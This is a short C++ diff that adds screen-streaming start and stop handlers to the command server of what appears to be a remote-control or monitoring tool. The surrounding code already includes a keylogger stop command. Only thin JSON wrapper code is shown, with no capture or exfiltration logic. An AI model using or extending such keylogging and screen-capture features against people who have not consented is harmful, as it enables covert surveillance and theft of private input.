@@ -198,6 +198,28 @@ json ProcessHandlers::stopKeylog(const json &)
     return {{"type", "status"}, {"success", true}, {"message", "Keylogger stopped"}};
 }
 
+json ProcessHandlers::startScreenStream(const json& req)
+{
+    int fps = req.value("fps", 60);
+    ScreenStream::start(fps);
+
+    return {
+        {"type","status"},
+        {"success",true},
+        {"message","Screen streaming started"}
+    };
+}
+
+json ProcessHandlers::stopScreenStream(const json&)
+{
+    ScreenStream::stop();
+    return {
+        {"type","status"},
+        {"success",true},
+        {"message","Screen streaming stopped"}
+    };
+}
+
 // Trả về danh sách tất cả command mà server hỗ trợ.
 json ProcessHandlers::help(const json &)
 {
